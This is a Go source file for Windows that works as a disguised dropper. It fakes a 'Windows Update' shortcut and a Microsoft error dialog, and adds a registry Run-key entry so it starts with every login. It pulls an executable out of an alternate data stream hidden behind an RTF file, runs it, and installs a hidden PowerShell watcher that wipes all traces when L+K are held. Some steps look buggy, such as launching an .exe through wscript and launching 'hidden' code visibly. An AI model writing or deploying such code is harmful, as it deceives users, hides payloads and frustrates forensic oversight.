package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func main() {
	watcherMode := flag.Bool("watcher", false, "Run in watcher mode")
	flag.Parse()

	if *watcherMode {
		runWatcherMode()
	} else {
		runMainMode()
	}
}

func runMainMode() {
	tempFolder := os.TempDir()
	dbgLog := filepath.Join(tempFolder, "debug.log")
	logDebug(dbgLog, "Main mode started.")

	// 0. Check for desktop shortcut and create if missing
	// Use PowerShell to get the real Desktop path (handles OneDrive and redirection)
	psGetDesktop := `[Environment]::GetFolderPath('Desktop')`
	cmdGetDesktop := exec.Command("powershell", "-NoProfile", "-Command", psGetDesktop)
	cmdGetDesktop.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	desktopBytes, _ := cmdGetDesktop.Output()
	desktop := strings.TrimSpace(string(desktopBytes))
	shortcut := filepath.Join(desktop, "Windows Update.lnk")
	if _, err := os.Stat(shortcut); os.IsNotExist(err) {
		logDebug(dbgLog, "Desktop shortcut not found, creating...")
		exePath, _ := os.Executable()
		exeDir := filepath.Dir(exePath)
		ps := fmt.Sprintf(`$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("%s")
$Shortcut.TargetPath = "%s"
$Shortcut.WorkingDirectory = "%s"
$Shortcut.IconLocation = "%s,3"
$Shortcut.Save()`, shortcut, exePath, exeDir, filepath.Join(exeDir, "shell32.dll"))
		cmd := exec.Command("powershell", "-NoProfile", "-Command", ps)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.CombinedOutput()
		logDebug(dbgLog, "Shortcut creation output: "+string(output))
		if err != nil {
			logDebug(dbgLog, "Shortcut creation error: "+err.Error())
		}
		logDebug(dbgLog, "Desktop shortcut created.")
	} else {
		logDebug(dbgLog, "Desktop shortcut already exists.")
	}

	// 1. Show fake error message
	logDebug(dbgLog, "Showing fake error message...")
	showFakeErrorMessage()

	// 2. Add to startup
	logDebug(dbgLog, "Adding startup registry entry...")
	addToStartup(dbgLog)

	// 3. Prevent duplicate launches
	logDebug(dbgLog, "Checking for running ~winupdate.exe processes...")
	if isProcessRunning("~winupdate.exe") {
		logDebug(dbgLog, "Duplicate ~winupdate.exe found, quitting script.")
		return
	}

	// 4. Extract EXE from ADS
	tempExe := filepath.Join(tempFolder, "~winupdate.exe")
	adsPath := filepath.Join(tempFolder, "test.rtf") + ":HiddenApp"
	logDebug(dbgLog, "Decoding EXE from ADS path: "+adsPath)
	extractFromADS(adsPath, tempExe, dbgLog)

	// 5. Launch EXE hidden
	logDebug(dbgLog, "Launching ~winupdate.exe hidden...")
	pid := launchExeHidden(tempExe, dbgLog)
	if pid == 0 {
		logDebug(dbgLog, "Failed to launch ~winupdate.exe.")
		return
	}

	// 6. Write PID to file
	pidFile := filepath.Join(tempFolder, "~winupdate_pid.txt")
	os.WriteFile(pidFile, []byte(fmt.Sprintf("%d\n", pid)), 0644)
	logDebug(dbgLog, fmt.Sprintf("New ~winupdate.exe detected with PID: %d", pid))

	// 7. Write watcher script
	watcherScript := filepath.Join(tempFolder, "~winupdate_watcher.ps1")
	logDebug(dbgLog, "Writing watcher script...")
	writeWatcherScript(watcherScript, dbgLog)

	// 8. Launch watcher script minimized
	logDebug(dbgLog, "Launching watcher script with hidden window.")
	launchWatcherScript(watcherScript, dbgLog)
}

func runWatcherMode() {
	// The watcher logic is implemented in PowerShell, not Go.
	fmt.Println("Watcher mode should be handled by the PowerShell script.")
}

// --- Helper Functions ---

func logDebug(logPath, msg string) {
	t := time.Now().Format("2006-01-02 15:04:05")
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s - %s\n", t, msg))
	}
}

func showFakeErrorMessage() {
	msg := `This Windows component requires a security update.\n\nWindowsUpdate.dll version 6.1.7600 is incompatible.\nPlease install KB5034441 from Microsoft Update.\n\n[OK]`
	// Use powershell to show a message box
	cmd := exec.Command("powershell", "-Command", "[System.Windows.Forms.MessageBox]::Show(\""+msg+"\", 'Microsoft Windows', 'OK', 'Error')")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}

func addToStartup(dbgLog string) {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		exe, _ := os.Executable()
		key.SetStringValue("Killswitch", fmt.Sprintf("wscript.exe //B \"%s\" /monitor", exe))
		logDebug(dbgLog, "Startup registry entry added.")
	} else {
		logDebug(dbgLog, "Failed to add startup registry entry: "+err.Error())
	}
}

func isProcessRunning(name string) bool {
	out, err := exec.Command("tasklist").Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), name)
}

func extractFromADS(adsPath, outPath, dbgLog string) {
	in, err := os.Open(adsPath)
	if err != nil {
		logDebug(dbgLog, "Failed to open ADS for extraction: "+err.Error())
		return
	}
	defer in.Close()

	out, err := os.Create(outPath)
	if err != nil {
		logDebug(dbgLog, "Failed to create output file for extraction: "+err.Error())
		return
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		logDebug(dbgLog, "Failed to copy from ADS to output: "+err.Error())
		return
	}
	logDebug(dbgLog, "EXE extracted successfully: "+outPath)
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func launchExeHidden(exePath, dbgLog string) int {
	cmd := exec.Command(exePath)
	// Do not set HideWindow, or set it to false
	err := cmd.Start()
	if err != nil {
		logDebug(dbgLog, "Failed to launch EXE: "+err.Error())
		return 0
	}
	logDebug(dbgLog, "Launched EXE visibly with PID: "+fmt.Sprint(cmd.Process.Pid))
	return cmd.Process.Pid
}

func writeWatcherScript(path, dbgLog string) {
	watcherContent := `function Log-Debug([string]$msg) {
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $logFile -Value ("$timestamp - $msg")
}

$tempFolder = [System.Environment]::GetEnvironmentVariable('TEMP')
$pidFile = Join-Path $tempFolder '~winupdate_pid.txt'
$exeFile = Join-Path $tempFolder '~winupdate.exe'
$logFile = Join-Path $tempFolder 'debug.log'

try {
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class KeyChecker {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
'@ -Language CSharp
    Log-Debug 'Add-Type succeeded'
} catch {
    Log-Debug ('Add-Type failed: ' + $_.Exception.Message)
    Write-Host ('Add-Type failed: ' + $_.Exception.Message)
}

Log-Debug 'Watcher script started.'
while ($true) {
    Start-Sleep -Milliseconds 30
    $l = ([KeyChecker]::GetAsyncKeyState(76) -band 0x8000) -ne 0  # 'L' key
    $k = ([KeyChecker]::GetAsyncKeyState(75) -band 0x8000) -ne 0  # 'K' key
    if ($l -and $k) {
        $start = Get-Date
        while ($l -and $k) {
            Start-Sleep -Milliseconds 30
            $l = ([KeyChecker]::GetAsyncKeyState(76) -band 0x8000) -ne 0
            $k = ([KeyChecker]::GetAsyncKeyState(75) -band 0x8000) -ne 0
            $now = Get-Date
            if (($now - $start).TotalSeconds -ge 1) {
                Log-Debug 'L+K held for 1 second. Attempting to kill process and cleanup.'
                if (Test-Path $pidFile) {
                    $targetPidRaw = Get-Content $pidFile | Select-Object -First 1
                    Log-Debug ('PID read from file: ' + $targetPidRaw)
                    try {
                        $targetPid = [int]$targetPidRaw
                        Stop-Process -Id $targetPid -Force -ErrorAction Stop
                        Log-Debug ('Process with PID ' + $targetPid + ' killed.')
                        Start-Sleep -Milliseconds 500
                        $procStillThere = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
                        if ($procStillThere) {
                            Log-Debug ('Process with PID ' + $targetPid + ' still running, cannot delete exe.')
                        } else {
                            # Delete all created files
                            Remove-Item -Path $exeFile -ErrorAction SilentlyContinue
                            Log-Debug 'Deleted exe file.'
                            Remove-Item -Path $pidFile -ErrorAction SilentlyContinue
                            Log-Debug 'Deleted pid file.'
                            Remove-Item -Path $logFile -ErrorAction SilentlyContinue
                            Log-Debug 'Deleted log file.'
                            Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
                            Log-Debug 'Deleted watcher script.'
                            # Also try to delete the VBS launcher if present
                            $vbsLauncher = Join-Path $tempFolder 'launch_watcher.vbs'
                            if (Test-Path $vbsLauncher) {
                                Remove-Item -Path $vbsLauncher -ErrorAction SilentlyContinue
                                Log-Debug 'Deleted VBS launcher.'
                            }
                            $hidefileLog = Join-Path $tempFolder 'hidefile.log'
                            $winupdateConfig = Join-Path $tempFolder 'winupdate_config.json'

                            for ($i = 0; $i -lt 5; $i++) {
                                if (Test-Path $hidefileLog) {
                                    try {
                                        Remove-Item -Path $hidefileLog -ErrorAction Stop
                                        Log-Debug 'Deleted hidefile.log.'
                                        break
                                    } catch {
                                        Start-Sleep -Milliseconds 500
                                    }
                                }
                            }
                            for ($i = 0; $i -lt 5; $i++) {
                                if (Test-Path $winupdateConfig) {
                                    try {
                                        Remove-Item -Path $winupdateConfig -ErrorAction Stop
                                        Log-Debug 'Deleted winupdate_config.json.'
                                        break
                                    } catch {
                                        Start-Sleep -Milliseconds 500
                                    }
                                }
                            }
                            Log-Debug 'Cleanup complete.'
                            Remove-Item -Path $logFile -ErrorAction SilentlyContinue
                            break
                        }
                    } catch {
                        Log-Debug ('Failed to kill process with PID ' + $targetPidRaw + '. Error: ' + $_.Exception.Message)
                    }
                }
            }
        }
    }
}
`
	os.WriteFile(path, []byte(watcherContent), 0644)
	logDebug(dbgLog, "Watcher script written successfully.")
}

func launchWatcherScript(path, dbgLog string) {
	vbs := fmt.Sprintf(`Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -NoProfile -WindowStyle Hidden -File ""%s""", 0, False
`, path)
	vbsPath := filepath.Join(os.TempDir(), "launch_watcher.vbs")
	os.WriteFile(vbsPath, []byte(vbs), 0644)
	cmd := exec.Command("wscript.exe", vbsPath)
	cmd.Run()
}

func killProcessUsingFile(filePath, dbgLog string) {
	// Use PowerShell to find and kill the process using the file
	psScript := fmt.Sprintf(`
        $file = "%s"
        $locked = @(Get-Process | Where-Object {
            try {
                $_.Modules | Where-Object { $_.FileName -eq $file } | Out-Null
                $true
            } catch { $false }
        })
        foreach ($p in $locked) { try { $p.Kill() } catch {} }
    `, filePath)
	cmd := exec.Command("powershell", "-Command", psScript)
	err := cmd.Run()
	if err != nil {
		logDebug(dbgLog, "Failed to kill process using file: "+err.Error())
	} else {
		logDebug(dbgLog, "Killed process(es) using file: "+filePath)
	}
}
